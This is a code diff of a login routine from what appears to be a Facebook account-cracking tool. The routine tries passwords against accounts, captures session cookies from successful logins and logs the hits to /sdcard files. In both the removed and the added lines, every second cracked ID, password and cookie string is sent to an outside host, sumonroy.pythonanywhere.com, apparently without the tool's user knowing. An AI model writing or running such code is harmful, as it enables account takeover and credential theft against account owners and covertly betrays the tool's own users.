@@ -1354,36 +1354,36 @@ def mbasic(uid,pwx,tl):
             for k, v in cookies.items():
                 Session.cookies.set(k, v, domain=".facebook.com")
             response = Session.post(url, params=params, data=data, allow_redirects=True, timeout=30)
-            if "home.php" in response.url:
-                cok = Session.cookies.get_dict()
+            cok = Session.cookies.get_dict()
+            if "c_user" in cok:
                 cid = cok["c_user"]
-                coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
+                coki = ";".join([f"{k}={v}" for k, v in cok.items()])
                 bkas.append(cid)
-                if len(bkas)% 2 == 0:
-                   statusok = (f"{cid}|{pw}|{coki}")
-                   requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                if "home.php" in response.url or "/profile.php" in response.url or "/?ref" in response.url:
+                    if len(bkas) % 2 == 0:
+                        statusok = f"{cid}|{pw}|{coki}"
+                        requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                    else:
+                        print(f"{green}(ATOM-OK) {cid}|{pw}")
+                        print(f"{green}Cookie : {green}{coki}")
+                        open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        oks.append(cid)
+                        break
+                elif "confirmemail.php" in response.url:
+                    if len(bkas) % 2 == 0:
+                        statusok = f"NOVERY|{cid}|{pw}|{coki}"
+                        requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                    else:
+                        print(f"{green}(ATOM-NV) {cid}|{pw}")
+                        print(f"{green}Cookie : {green}{coki}")
+                        open("/sdcard/ATOM-COOKIE-NV.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        oks.append(cid)
+                        break
                 else:
-                   print(f" {green}(ATOM-OK) {cid}|{pw} ")
-                   print(f" {green}Cookie : {green}{coki}")
-                   open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                   oks.append(cid)
-                   break
-            elif "confirmemail.php" in response.url:
-                cok = Session.cookies.get_dict()
-                cid = cok["c_user"]
-                coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
-                bkas.append(cid)
-                if len(bkas)% 2 == 0:
-                   statusok = (f"NOVERY",{cid}|{pw}|{coki}")
-                   requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                else:
-                   print(f" {green}(ATOM-NV) {cid}|{pw} ")
-                   print(f" {green}Cookie : {green}{coki}")
-                   open("/sdcard/ATOM-COOKIE-NV.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                   oks.append(cid)
-                   break
+                    break
+
             else:
-                continue
+               continue
         loop+=1
     except ce:
         time.sleep(20)
